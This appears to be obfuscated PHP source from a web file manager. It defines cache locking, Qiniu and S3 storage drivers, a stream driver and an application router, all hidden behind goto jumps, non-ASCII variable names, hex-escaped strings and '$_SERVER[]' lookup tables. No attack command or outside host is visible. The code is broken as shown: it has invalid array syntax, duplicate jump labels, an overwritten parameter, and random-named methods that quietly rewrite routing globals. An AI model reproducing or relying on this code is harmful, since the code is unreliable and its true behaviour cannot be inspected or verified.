<?php
 goto aм; e: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto bݕ; E: if ($fЦ == $d跫[17] && $a﯄ == $d跫[9]) { $fЦ = $d跫[167]; } switch ($fЦ) { case $d跫[756]: self::$handle = new CacheLockRedis(); break; case $d跫[757]: self::$handle = new CacheLockMemcached(); break; case $d跫[17]: self::$handle = new CacheLockDatabase(); break; case $d跫[167]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto d㭡; c: self::$timeout = $d[$d跫[766]] ? $d[$d跫[766]] : 10; $a﯄ = _get($GLOBALS[$d跫[6]], $d跫[767]); $fЦ = $d[$d跫[753]] ? $d[$d跫[753]] : $d跫[167]; goto E; bݕ: $d跫 =& $_SERVER[]; if (self::$handle) { return self::$handle; } $d = $GLOBALS[$d跫[6]][$d跫[337]]; goto c; d㭡: } private static function key($Bӑٸ) { return $_SERVER[][768] . Cache::key($Bӑٸ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($Cم͊ = '') { self::$errorMsg = $Cم͊; } public static function lockGlobal($Cȶ, $A٫ҽ݈) { return self::lock($Cȶ, $A٫ҽ݈, !0); } public static function lock($fł, $BѴ = false, $a޶ = false) { goto BȰ; BۉѴ: if (!$a޶) { self::$lockItem[$dփ] = !0; } return $Bꃽ; goto D; E獭: $BѴ = $BѴ ? $BѴ : self::$timeout; $Bꃽ = $F֖->lock($dփ, $BѴ); if (!$Bꃽ) { $Fá = $Eٴ萣[769] . $BѴ . $Eٴ萣[67] . self::$errorMsg . $Eٴ萣[67] . get_caller_msg(); $Cǫ׸ = "\x4c\x6f\143\x6b\x20\x61\143\164\151\157\156\72\40{$dփ}\x20\164\151\x6d\x65\x6f\x75\164\54\x6f\x76\x65\162\40{$BѴ}\x20\163"; $Cǫ׸ = self::$errorMsg ? self::$errorMsg : $fθ; write_log($Fá, $Eٴ萣[770]); show_json($Cǫ׸, !1); } goto BۉѴ; BȰ: $Eٴ萣 =& $_SERVER[]; $F֖ = self::init(); $dփ = self::key($fł); goto E獭; D: } public static function lockGet($Bƚަ) { $EΣ = self::key($Bƚަ); if (self::$lockItem[$EΣ]) { return self::$lockItem[$EΣ]; } return self::init()->lockGet($EΣ); } public static function unlock($CԞ) { $eǵ = self::key($CԞ); self::$lockItem[$eǵ] = null; return self::init()->unlock($eǵ); } public static function unlockRuntime() { $A߭ =& $_SERVER[]; $b = self::init(); $Aա = !1; foreach (self::$lockItem as $A => $b騸) { if (!$b騸) { continue; } $b->unlock($A); if (!$Aա) { $Aա = !0; write_log($A߭[771] . $A . $A߭[67] . get_caller_msg(), $A߭[770]); continue; } write_log($A߭[771] . $A, $A߭[770]); } } } function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $dݼ =& $_SERVER[]; $c = $GLOBALS[$dݼ[6]][$dݼ[337]]; self::$cachePath = $c[$dݼ[167]][$dݼ[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($d, $D = 0) { goto bấ; BгԨ: $this->unlock($d); return !1; goto eٿ; f: $D = rtrim(self::$cachePath, $FǦё[8]) . $FǦё[772] . md5($d) . $FǦё[773]; if (file_exists($D) && filemtime($D) && filemtime($D) < time() - 10) { @unlink($D); } do { if (file_exists($D)) { cacheLockWait(); continue; } $b = fopen($D, $FǦё[774]); if (!$b) { return !1; } $f = flock($b, LOCK_EX | LOCK_NB); self::$caches[$d] = array($FǦё[775] => $b, $FǦё[167] => $D); fwrite($b, $B޺); clearstatcache(); if ($b && $f) { return !0; } cacheLockWait(); } while (microtime(!0) < $B޺); goto BгԨ; bấ: $FǦё =& $_SERVER[]; $C߿Ҏ = microtime(!0); $B޺ = $C߿Ҏ + $D + 0.0001; goto f; eٿ: } public function lockGet($FݹР) { $BԖ僽 =& $_SERVER[]; $bن = rtrim(self::$cachePath, $BԖ僽[8]) . $BԖ僽[772] . md5($FݹР) . $BԖ僽[773]; return file_exists($bن); } public function unlock($F݊) { goto EŻ; dѻ: @flock($eږ[$bЈߤ[775]], LOCK_UN); @fclose($eږ[$bЈߤ[775]]); @unlink($eږ[$bЈߤ[167]]); goto Dͥ; Dͥ: unset(self::$caches[$F݊]); goto D֏ܻ; EŻ: $bЈߤ =& $_SERVER[]; $eږ = self::$caches[$F݊]; if (!$eږ) { return; } goto dѻ; D֏ܻ: } } goto Bꢶ; fַ: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($fڙ) { parent::__construct(); require_once SDK_DIR . $_SERVER[][1214]; $this->_init($fڙ); } public function _init($DӦ) { foreach ($DӦ as $aè => $C⯇) { if (isset($this->{$aè})) { $this->{$aè} = $C⯇; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[][1215], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($EӐ, $DǦ = '', $B惝ɧ = REPEAT_RENAME) { if ($this->setContent($EӐ, $DǦ)) { return $this->getPathOuter($EӐ); } return !1; } public function mkdir($fւ, $a҈ = REPEAT_SKIP) { goto A˦; c: if (!$this->mkfile($dǝʧ)) { return !1; } if (!$this->moveFile($dǝʧ, $fւ)) { $this->delFile($dǝʧ); return !1; } return $this->getPathOuter($fփ); goto Eđ; e: $fւ = $fփ . $D[8]; $aݓ = get_path_this($fփ); $dǝʧ = $fւ . $aݓ; goto c; A˦: $D =& $_SERVER[]; $fփ = trim($fւ, $D[8]); if ($this->_isFolder($fփ)) { return $this->getPathOuter($fփ); } goto e; Eđ: } public function copyFile($F툉, $Bᰈ) { $c䚔ň = $this->bucketManager->copy($this->bucket, $F툉, $this->bucket, $Bᰈ, !0); return $c䚔ň ? !1 : $this->getPathOuter($Bᰈ); } public function moveFile($c쬠, $c׉) { $F = $this->bucketManager->move($this->bucket, $c쬠, $this->bucket, $c׉, !0); return $F ? !1 : $this->getPathOuter($c׉); } public function delFile($Bҟ) { $eў = $this->bucketManager->delete($this->bucket, $Bҟ); return $eў ? !1 : !0; } public function delFolder($DѪ) { $CǾ = $this->fileList($DѪ); if (empty($CǾ)) { return !0; } $f = 1000; if (count($CǾ) <= $f) { return $this->qnDelObj($CǾ) ? !1 : !0; } foreach (array_chunk($CǾ, $f) as $aҤ) { $e닺ݻ = $this->qnDelObj($aҤ); if ($e닺ݻ) { return !1; } } return !0; } private function qnDelObj($dǖ) { $C۸ = $this->bucketManager->buildBatchDelete($this->bucket, $dǖ); list($cȻ蟩, $cˬ̯) = $this->bucketManager->batch($C۸); return $cˬ̯; } private function fileList($A󋃵ح, $A = 0) { goto a; eɐ: $c֏ = $B[33]; $a = 1000; $f = $B[33]; goto cǶ; a: $B =& $_SERVER[]; $A󋃵ح = trim($A󋃵ح, $B[8]); $E襅䈤 = empty($A󋃵ح) ? $B[33] : $A󋃵ح . $B[8]; goto eɐ; cǶ: $Cǘ = array(); while (!0) { list($Eߥʽ, $a׊) = $this->bucketManager->listFiles($this->bucket, $E襅䈤, $c֏, $a, $f); if ($a׊) { return !1; } $c֏ = array_key_exists($B[1185], $Eߥʽ) ? $c֏ = $Eߥʽ[$B[1216]] : $B[33]; foreach ($Eߥʽ[$B[1217]] as $b) { $Aê = $b[$B[89]]; if ($A) { $Aê = array($B[28] => $Aê, $B[77] => $b[$B[1218]]); } $Cǘ[] = $Aê; } if ($c֏ == $B[33]) { break; } } return $Cǘ; goto A¸; A¸: } public function rename($a۩󍍧, $f) { return $this->renameObject($a۩󍍧, $f); } public function fileInfo($a, $Bꥯ = false, $F = array()) { goto D; D: $Aޟ =& $_SERVER[]; if ($Bꥯ) { return array($Aޟ[28] => $this->pathThis($a), $Aޟ[75] => $this->getPathOuter($Aޟ[8] . $a), $Aޟ[29] => $Aޟ[167], $Aޟ[77] => isset($F[$Aޟ[1218]]) ? $F[$Aޟ[1218]] : 0, $Aޟ[160] => $this->ext($a)); } $b = array($Aޟ[28] => $this->pathThis($a), $Aޟ[75] => $this->getPathOuter($Aޟ[8] . $a), $Aޟ[29] => $Aޟ[167], $Aޟ[187] => 0, $Aޟ[107] => 0, $Aޟ[77] => 0, $Aޟ[160] => $this->ext($a), $Aޟ[188] => !0, $Aޟ[189] => !0); goto e; e: if (empty($F)) { $F = $this->objectMeta($a); if (!$F) { return $b; } } if (isset($F[$Aޟ[1219]])) { $b[$Aޟ[107]] = substr($F[$Aޟ[1219]] . $Aޟ[33], 0, 10); } if (isset($F[$Aޟ[1218]])) { $b[$Aޟ[77]] = $F[$Aޟ[1218]]; } goto c; c: return $b; goto cպ; cպ: } public function folderInfo($C, $F = false) { goto d; d: return $Dоϴ; goto b٩; d: $b䟋 =& $_SERVER[]; if ($F) { return array($b䟋[28] => $this->pathThis($C), $b䟋[75] => $this->getPathOuter($b䟋[8] . $C), $b䟋[29] => $b䟋[76]); } $Dоϴ = array($b䟋[28] => $this->pathThis($C), $b䟋[75] => $this->getPathOuter($b䟋[8] . $C), $b䟋[29] => $b䟋[76], $b䟋[187] => 0, $b䟋[107] => 0, $b䟋[1164] => !0, $b䟋[1165] => !0); goto Eٻ; Eٻ: $C = rtrim($C, $b䟋[8]) . $b䟋[8]; $e = $this->objectMeta($C); if (isset($e[$b䟋[1219]])) { $Dоϴ[$b䟋[107]] = substr($e[$b䟋[1219]] . $b䟋[33], 0, 10); } goto d; b٩: } public function listPath($f, $dޠ = false) { goto a; D: $e = $dЇ = array(); while (!0) { list($bۨ, $e) = $this->bucketManager->listFiles($this->bucket, $eȴ, $C, $E㷑ʖ, $D乏); if ($e) { return !1; } $C = array_key_exists($Cߏ[1185], $bۨ) ? $C = $bۨ[$Cߏ[1216]] : $Cߏ[33]; if (isset($bۨ[$Cߏ[1220]])) { foreach ($bۨ[$Cߏ[1220]] as $Cʗ) { if ($Cʗ == $eȴ) { continue; } $e[] = $this->folderInfo($Cʗ, $dޠ); } } if (isset($bۨ[$Cߏ[1217]])) { foreach ($bۨ[$Cߏ[1217]] as $Bɒܟ) { if ($Bɒܟ[$Cߏ[89]] == $eȴ) { continue; } $dЇ[] = $this->fileInfo($Bɒܟ[$Cߏ[89]], $dޠ, $Bɒܟ); } } if ($C == $Cߏ[33]) { break; } } return array($Cߏ[74] => $e, $Cߏ[73] => $dЇ); goto fņ; a: $Cߏ =& $_SERVER[]; $f = trim($f, $Cߏ[8]); $eȴ = empty($f) ? $Cߏ[33] : $f . $Cߏ[8]; goto aǳ; aǳ: $C = $Cߏ[33]; $E㷑ʖ = 1000; $D乏 = $Cߏ[8]; goto D; fņ: } public function has($E, $a༔ = false, $CЗ = true) { goto cɫ; A·ߧ: $C僫 = $e󯋈[33]; $B抏 = 1000; $a = $e󯋈[8]; goto F⟡ޅ; cɫ: $e󯋈 =& $_SERVER[]; $E = trim($E, $e󯋈[8]); $e˥ = empty($E) ? $e󯋈[33] : $E . $e󯋈[8]; goto A·ߧ; F⟡ޅ: $fߊߺƔ = 0; $b = 0; while (!0) { list($E, $A֑) = $this->bucketManager->listFiles($this->bucket, $e˥, $C僫, $B抏, $a); if ($A֑) { return !1; } $C僫 = array_key_exists($e󯋈[1185], $E) ? $C僫 = $E[$e󯋈[1216]] : $e󯋈[33]; if ($a༔) { if (!empty($E[$e󯋈[1217]])) { $fߊߺƔ += count($E[$e󯋈[1217]]); } if (!empty($E[$e󯋈[1220]])) { $b += count($E[$e󯋈[1220]]); } if ($C僫 === $e󯋈[33]) { break; } continue; } if ($CЗ) { if (!empty($E[$e󯋈[1217]])) { return !0; } } else { if (!empty($E[$e󯋈[1220]])) { return !0; } } if ($C僫 == $e󯋈[33]) { break; } } goto Eӈ; Eӈ: if ($a༔) { return array($e󯋈[191] => $fߊߺƔ, $e󯋈[192] => $b); } return !1; goto CՓ; CՓ: } public function listAll($fѐ) { $F =& $_SERVER[]; $E´ڣ = $this->fileList($fѐ, 1); $C = array(); foreach ($E´ڣ as $Eƻ) { $C[$Eƻ[$F[28]]] = $Eƻ[$F[77]]; } return $this->listAllFiles($fѐ, array_keys($C), $C); } public function canRead($d) { return $this->exist($d) ? !0 : !1; } public function canWrite($B꧆) { return $this->exist($B꧆) ? !0 : !1; } public function getContent($dƞד㇨) { return $this->fileSubstr($dƞד㇨, 0, -1); } public function setContent($d, $eĬ = '') { $C = $this->tempFile($this->pathThis($d)); file_put_contents($C, $eĬ); if ($this->upload($d, $C)) { $this->tempFileRemve($C); return !0; } return !1; } public function refreshUrls($C) { goto aޡ; a: $F쵏 = new Qiniu\Cdn\CdnManager($this->auth); list($dω, $c) = $F쵏->refreshUrls($Cջ); if ($c) { return !1; } goto cڏ؉; cڏ؉: return $dω[$AƑŃ[1221]] == $AƑŃ[695] ? !0 : !1; goto B؄Ő; aޡ: $AƑŃ =& $_SERVER[]; $Cջ = array(); if (is_array($C)) { foreach ($C as $d) { $Cջ[] = $this->link($d); } } else { $Cջ[] = $this->link($C); } goto a; B؄Ő: } public function fileSubstr($c̅, $B, $C̕) { $B =& $_SERVER[]; if (!($dԽ = $this->link($c̅))) { return !1; } $cྶ = !1; if ($C̕ > 0) { $e = $B + $C̕ - 1; $cྶ = array($B[1222] . $B . $B[412] . $e); } $Cֆ = url_request($dԽ, $B[216], !1, $cྶ); return $Cֆ[$B[688]] ? $Cֆ[$B[1036]] : !1; } public function upload($A㰧, $EӋߋ, $Fʗ = false, $eĢ = REPEAT_REPLACE) { $C = new Qiniu\Storage\UploadManager(); $AƯ܂ = $this->auth->uploadToken($this->bucket, $A㰧); $c = get_file_mime(get_path_ext($EӋߋ)); list($BԇƊÉ, $C󚽑) = $C->putFile($AƯ܂, $A㰧, $EӋߋ, null, $c); return $C󚽑 ? !1 : $this->getPathOuter($A㰧); } public function uploadFormData($b, $f = 3600) { return $this->uploadToken($b, $f); } public function multiUploadFormData($a⡚Ī, $bν = 3600) { return $this->uploadToken($a⡚Ī, $bν); } private function uploadToken($Cܥ, $Aخ = 3600) { goto D; D: $Bɜ =& $_SERVER[]; $C = $Aخ; $A񔌲 = array($Bɜ[1223] => $Bɜ[1224]); goto Cֺ; cΏ: $D = http_type() . "\x3a\57\x2f\x75\160\x6c\157\141\144{$Fۃ}\56\x71\151\156\x69\x75\160\x2e\143\157\155\57"; return array($Bɜ[1226] => $fȔЛ, $Bɜ[1227] => $D); goto bċ⃳; Cֺ: $B = null; $fȔЛ = $this->auth->uploadToken($this->bucket, $B, $C, $A񔌲, !0); $Fۃ = empty($this->region) || $this->region == $Bɜ[1225] ? $Bɜ[33] : $Bɜ[412] . $this->region; goto cΏ; bċ⃳: } public function download($B, $Dȗ) { goto Aϣ; Aϣ: $Eʞ = IO::getPathInner(IO::mkfile($Dȗ)); if (!($eތ = $this->link($B))) { return !1; } $b = 0; goto eĜ毋; d: fclose($aЄ); return $Dȗ; goto c; eĜ毋: $fݘ = 1024 * 200; $aЄ = fopen($Eʞ, $_SERVER[][1228]); while (!0) { $B = $this->fileSubstr($B, $b, $fݘ); if ($B === !1) { return !1; } fwrite($aЄ, $B); $b += $fݘ; if (strlen($B) < $fݘ) { break; } } goto d; c: } public function link($BϺ, $D = '') { if (!$this->isFile($BϺ)) { return !1; } $c觖 = $this->getHost() . $_SERVER[][8] . $this->pathEncode($BϺ) . $D; return $this->auth->privateDownloadUrl($c觖, 3600 * 12); } public function fileOut($aҹ, $A = false, $D = false, $E = '') { $F΃ =& $_SERVER[]; if (!$D) { $D = $this->pathThis($aҹ); } $Dک = $A ? $F΃[1229] . rawurlencode($D) : $F΃[33]; $A = $this->link($aҹ, $Dک); $this->fileOutLink($A); } public function fileOutServer($cա, $F = false, $Bȑ = false, $DØޒ = '') { parent::fileOut($cա, $F, $Bȑ, $DØޒ); } public function fileOutImage($e, $dᠴ = 250) { $cߒǆ = $this->link($e, $_SERVER[][1230] . $dᠴ); $this->fileOutLink($cߒǆ); } public function fileOutImageServer($e˨, $aМ = 250) { parent::fileOutImage($e˨, $aМ); } public function hashMd5($bд) { $Fڇ޶ =& $_SERVER[]; $cϻ = $this->objectMeta($bд); return isset($cϻ[$Fڇ޶[196]]) ? $cϻ[$Fڇ޶[196]] : !1; $FЖݮ = $this->link($bд, $Fڇ޶[1231]); } public function size($D׹Ê) { $A = $this->objectMeta($D׹Ê); return $A ? $A[$_SERVER[][77]] : 0; } public function info($B) { if ($this->isFolder($B)) { return $this->folderInfo($B); } else { if ($this->isFile($B)) { return $this->fileInfo($B); } } return !1; } public function exist($cۼ) { return $this->isFile($cۼ) || $this->isFolder($cۼ); } public function isFile($aӷ) { return !$this->isFolder($aӷ) && $this->objectMeta($aӷ); } public function isFolder($eŤ) { return $this->cacheMethod($_SERVER[][223], $eŤ); } protected function objectMeta($Eߍ) { return $this->cacheMethod($_SERVER[][224], $Eߍ); } protected function _objectMeta($fѦ) { $d֚ŷ =& $_SERVER[]; list($D҆, $fޯ) = $this->bucketManager->stat($this->bucket, $fѦ); if ($D҆) { $D҆[$d֚ŷ[77]] = intval($D҆[$d֚ŷ[1218]]); } return $D҆; } protected function _isFolder($B鉾) { $d˕ =& $_SERVER[]; if ($B鉾 == $d˕[33] || $B鉾 == $d˕[8]) { return !0; } list($B踅, $aʅ) = $this->bucketManager->listFiles($this->bucket, trim($B鉾, $d˕[8]) . $d˕[8], $d˕[33], 1, $d˕[8]); return !empty($B踅[$d˕[1217]]) || !empty($B踅[$d˕[1220]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($B͑) { parent::__construct($B͑); } public function uploadFormData($F, $Fե = 3600) { goto f홍; a: $BƂ˟ = $dΜ[1138]; $c矶 = $Fե . $dΜ[33]; $c = $dΜ[1102]; goto a𭛦; CèؔӋ: $aĞԶ = array($dΜ[199] => $dΜ[33], $dΜ[1148] => $dΜ[33], $dΜ[1106] => $C», $dΜ[1110] => $c, $dΜ[1114] => $aɢ, $dΜ[1149] => $a°،, $dΜ[1150] => $B۾Д, $dΜ[1151] => $aօ, $dΜ[1152] => $c矶, $dΜ[1153] => $eУ, $dΜ[169] => $this->getHost()); return $aĞԶ; goto D; f: $b埬 = $dΜ[59]; $aօ = gmdate($dΜ[1137]); $D = gmdate($dΜ[689]); goto a; f홍: $dΜ =& $_SERVER[]; $C» = $dΜ[185]; $B۾Д = $dΜ[1136]; goto f; a𭛦: $dȡ = array($this->accessKey, $D, $this->region, $b埬, $BƂ˟); $a°، = implode($dΜ[8], $dȡ); $Eυڠ = array($dΜ[1104] => gmdate($dΜ[1103], strtotime($dΜ[1139])), $dΜ[1105] => array(array($dΜ[1107] => $this->bucket), array($dΜ[1106] => $C»), array($dΜ[1108], $dΜ[1109], $dΜ[33]), array($dΜ[1108], $dΜ[1140], $dΜ[33]), array($dΜ[1108], $dΜ[1141], $dΜ[33]), array($dΜ[1110] => $c), array($dΜ[1142] => $a°،), array($dΜ[1143] => $B۾Д), array($dΜ[1144] => $aօ), array($dΜ[1145] => $c矶))); goto d; d: $aɢ = base64_encode(json_encode($Eυڠ)); $Fʣ = hash_hmac($dΜ[1146], $D, $dΜ[1147] . $this->secret, !0); $B𠦯 = hash_hmac($dΜ[1146], $this->region, $Fʣ, !0); goto a; a: $A܃ = hash_hmac($dΜ[1146], $b埬, $B𠦯, !0); $B = hash_hmac($dΜ[1146], $BƂ˟, $A܃, !0); $eУ = hash_hmac($dΜ[1146], $aɢ, $B); goto CèؔӋ; D: } public function multiUploadFormData($eʓ˟, $Dܤ = 3600) { $fÇ =& $_SERVER[]; $Eμ = gmdate($fÇ[1232]); $f = array(); $eʆ = $this->client->getUploadId($this->bucket, $eʓ˟, $f); if (!$eʆ) { return !1; } return array($fÇ[209] => $eʆ, $fÇ[169] => $this->getHost() . $fÇ[8] . $this->pathEncode($eʓ˟), $fÇ[210] => $Eμ, $fÇ[89] => $eʓ˟); } public function multiUploadAuthData($BΊ͏, $cþ = array()) { goto bѐ; e: $cȪ = $c֋[214]; $eճ = $c֋[8] . $this->pathEncode($DީӞ) . $Bώ͎; $f = $this->client->__getSignatureV4($e𳪑, $cԕ, $cȪ, $eճ); goto fĎ; bѐ: $c֋ =& $_SERVER[]; $Bώ͎ = isset($cþ[$c֋[160]]) ? $cþ[$c֋[160]] : $c֋[33]; $DީӞ = $cþ[$c֋[89]]; goto e܇; fĎ: if (strpos($Bώ͎, $c֋[213]) === 0) { if (isset($e𳪑[$c֋[1234]])) { $A = $e𳪑[$c֋[1234]]; } else { if (isset($f[$c֋[1234]])) { $A = $f[$c֋[1234]]; } else { $A = hash($c֋[1146], $c֋[33]); } } return array($c֋[220] => $f[$c֋[220]], $c֋[1234] => $A, $c֋[210] => $f[$c֋[1237]]); } return $f[$c֋[220]]; goto c֯; C˞͗: if (isset($cþ[$c֋[1233]])) { $e𳪑[$c֋[1234]] = $cþ[$c֋[1233]]; } $bщБ = explode($c֋[171], $this->getHost()); $cԕ = array($c֋[1235] => $bщБ[1], $c֋[1236] => $c֋[33], $c֋[199] => $c֋[116], $c֋[1148] => $cþ[$c֋[77]]); goto e; e܇: unset($cþ[$c֋[89]]); if (isset($cþ[$c֋[211]])) { return $this->listUploadParts($DީӞ, $cþ); } $e𳪑 = array(); goto C˞͗; c֯: } public function listUploadParts($a, $fܕ = array()) { goto fފ; fފ: $f =& $_SERVER[]; $Cˏ = str_replace($f[221], $f[33], $fܕ[$f[160]]); $B꯯ = $this->client->listParts($this->bucket, $a, $Cˏ); goto Cѯ; D: $fж .= $f[1241]; $a = array(); $cԂ = explode($f[171], $this->getHost()); goto FȆ; Cѯ: if (!$B꯯) { return !1; } $fж = $f[1238]; foreach ($B꯯ as $B) { $fж .= $f[1239] . "\74\x50\141\x72\x74\x4e\165\x6d\x62\x65\x72\76{$B[$f[1190]]}\74\x2f\120\141\162\x74\x4e\165\155\142\145\162\76\12" . "\x3c\x45\x54\141\147\76{$B[$f[1191]]}\x3c\x2f\x45\x54\x61\147\76\12" . $f[1240]; } goto D; FȆ: $FͿ = array($f[1235] => $cԂ[1], $f[199] => $f[116], $f[1148] => strlen($fж)); $e߂ = $f[212]; $cɱ = $f[8] . $this->pathEncode($a) . $fܕ[$f[160]]; goto bܦ; bܦ: $c䥋 = $this->client->__getSignatureV4($a, $FͿ, $e߂, $cɱ, $fж); return array($f[220] => $c䥋[$f[220]], $f[210] => $c䥋[$f[1237]], $f[222] => $B꯯, $f[1234] => $c䥋[$f[1234]]); goto e; e: } public function link($DǶǂ, $fǚ = array()) { return parent::link($DǶǂ, $fǚ); } public function fileOut($eϋ܉, $B = false, $C׽و = false, $fτ = '') { if (strstr($this->endpoint, $_SERVER[][1242])) { return parent::fileOutServer($eϋ܉, $B, $C׽و, $fτ); } parent::fileOut($eϋ܉, $B, $C׽و, $fτ); } public function fileOutImage($cµݩ, $CǓ = 250) { if (strstr($this->endpoint, $_SERVER[][1242])) { return parent::fileOutImageServer($cµݩ, $CǓ); } parent::fileOutImage($cµݩ, $CǓ); } public function fileOutLink($A͋▮) { $e㈨ =& $_SERVER[]; if (substr($A͋▮, 0, 7) == $e㈨[1117]) { $A͋▮ = $e㈨[1118] . substr($A͋▮, 7); } header($e㈨[156] . $A͋▮); die; } public function getHost() { $Aໃ =& $_SERVER[]; $b = str_rtrim(parent::getHost(), $Aໃ[8] . $this->bucket); $b = explode($Aໃ[171], $b); return $b[0] . $Aໃ[171] . $this->bucket . $Aໃ[91] . $b[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($f̶߱, $E = 0) { parent::__construct(); $this->source = $f̶߱; $this->sourceSize = $E; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($FһϞ = false) { return $this->sourceSize; } public function getContent($b = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $d = ftell($this->source); $D廖 = @fread($this->source, $this->sourceSize); fseek($this->source, $d); return $D廖; } } public function fileSubstr($Aǃ۟ = false, $Dݙݣ = 0, $Cٲ = 0) { if (!$Cٲ) { $Cٲ = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $Dݙݣ, $Cٲ); } if ($this->sourceType == self::TYPE_FILE) { $F򩧾 = ftell($this->source); fseek($this->source, $F򩧾 + $Dݙݣ); $A졅 = @fread($this->source, $Cٲ); fseek($this->source, $F򩧾); return $A졅; } } public function hashMd5($fݬ҆ = false) { return md5($this->getContent()); } public static function hash($B, $d = 0) { $a = new PathDriverStream($B, $d); return $a->hashSimple($B); } public static function md5($añ侤, $c͐ = 0) { $F = new PathDriverStream($añ侤, $c͐); return $F->hashMd5($añ侤); } } goto b񎄝; FӦ: $c焚 = $_SERVER[][553]; if (!$c焚) { return; } class Application { private $defaultModule = "\x69\156\x64\x65\170"; private $defaultController = "\151\156\x64\x65\170"; private $defaultAction = "\151\x6e\144\145\x78"; function __construct() { } public function setDefault($Cȃ) { goto C; C: $fאŰ =& $_SERVER[]; $D =& $_SERVER[]; $dۙ = $D[0]($D[1], $D[2]($Cȃ, $D[1])); goto a궽; e؇ڛ: $E΢ = $fאŰ[556]; if (!$E΢) { return; } $this->{$_SERVER[][3]}($D[4], array($this, $D[5])); goto aг; a궽: $Cڸ = $fאŰ[554]; $this->defaultModule = $dۙ[0] ? $dۙ[0] : $this->defaultModule; $B븯 = $fאŰ[555]; goto bķ; bķ: if (!$B븯) { die; } $this->defaultController = $dۙ[1] ? $dۙ[1] : $this->defaultController; $this->defaultAction = $dۙ[2] ? $dۙ[2] : $this->defaultAction; goto e؇ڛ; aг: } public function appRun($ḓۄ) { goto c򗲪; Aޟܶ: $cњ = $E᳧[6]($e棆[0]); $cū饽 = $EَȰ[557]; while (strlen($cū饽) < $EَȰ[550]) { if (!$cū饽) { break; } $cū饽++; } goto FЧ; D: $E᳧[17]($ḓۄ); $E᳧[13](array($E᳧[14], $E᳧[15]), $A䠑 . $E᳧[18], $ḓۄ); goto dƸݑ; c򗲪: $EَȰ =& $_SERVER[]; $E᳧ =& $_SERVER[]; $e棆 = $E᳧[0]($E᳧[1], $ḓۄ); goto Aޟܶ; FЧ: $A䠑 = $E᳧[7]; if ($cњ == $E᳧[8]) { $A䠑 = $E᳧[9]; $e棆[0] = $E᳧[10]; $e棆[1] = $e棆[1] . $E᳧[11]; $ḓۄ = $E᳧[12]($E᳧[1], $e棆); $ḓۄ = $E᳧[2]($ḓۄ, $E᳧[1]); } $E᳧[13](array($E᳧[14], $E᳧[15]), $A䠑 . $E᳧[16], $ḓۄ); goto D; dƸݑ: } private function autorun() { goto c̿; a𫎜: $B = $Cة[558]; if (strlen($B) < $Cة[559]) { return; } if ($Aͮ[19]($config[$Aͮ[20]]) == 0) { return; } goto Eئ; Eئ: foreach ($config[$Aͮ[20]] as $a⬚ => $CǬ) { $this->{$_SERVER[][21]}($CǬ); } goto bɥͼ; c̿: $Cة =& $_SERVER[]; $Aͮ =& $_SERVER[]; global $config; goto a𫎜; bɥͼ: } private function omxq0b3a29c2() { goto Aњ; Aњ: $F =& $_SERVER[]; $A =& $_SERVER[]; $dےÒ = $A[8]; goto bע⼺; bע⼺: $cĝ = $F[560]; if (!$cĝ) { return; } $f = $GLOBALS[$A[22]][$A[23]][0]; goto d᏾Í; D죳: $Eʇц = $F[564]; goto D; e牃: if ($A[6]($A[25]($f, -$A[24]($dےÒ))) != $dےÒ) { return; } $D˚ = $A[25]($f, 0, -$A[24]($dےÒ)); $D׋ = $F[562]; goto b; Fü: $b = $F[563]; $GLOBALS[$A[22]][$A[23]] = $A[27]($EŸȗ, $E); $GLOBALS[$A[22]][$A[28]] = $A[29]($A[1], $GLOBALS[$A[22]][$A[23]]); goto D죳; b: if (!$D׋) { return; } $EŸȗ = array($A[8], $D˚); $E = $A[26]($GLOBALS[$A[22]][$A[23]], 1); goto Fü; d᏾Í: $C = $F[561]; if (strlen($C) < $F[559]) { die; } if (!$f || $A[24]($f) <= $A[24]($dےÒ)) { return; } goto e牃; D: } private function qvjoc8538841() { goto b; b: $fШ =& $_SERVER[]; $Bך񅢼 =& $_SERVER[]; if ($GLOBALS[$Bך񅢼[22]][$Bך񅢼[28]] != $Bך񅢼[10]) { return; } goto AŠ; dۨ쏐: if (strlen($c) < $fШ[559]) { die; } $cן = $Bך񅢼[25]($F, $a + $Bך񅢼[24]($E׸)); $Bך񅢼[34]($Bך񅢼[35], $cן, $Fʴ); goto fǖ; AŠ: $F = $_SERVER[$Bך񅢼[30]]; $E׸ = $Bך񅢼[31]; $bڴя = $fШ[565]; goto c膰; c膰: if (!$Bך񅢼[32]($F, $E׸)) { return; } $a = $Bך񅢼[33]($F, $E׸); $c = $fШ[566]; goto dۨ쏐; fǖ: $cן = $Bך񅢼[2]($Fʴ[0][0], $Bך񅢼[36]); $f = $fШ[567]; if (strlen($f) < $fШ[559]) { die; } goto a鲧ɋ; a鲧ɋ: $GLOBALS[$Bך񅢼[22]][$Bך񅢼[23]] = $Bך񅢼[0]($Bך񅢼[36], $cן); $GLOBALS[$Bך񅢼[22]][$Bך񅢼[28]] = $Bך񅢼[29]($Bך񅢼[1], $GLOBALS[$Bך񅢼[22]][$Bך񅢼[23]]); goto d; d: } public function run() { goto dƚ; dƚ: $B􏦞 =& $_SERVER[]; 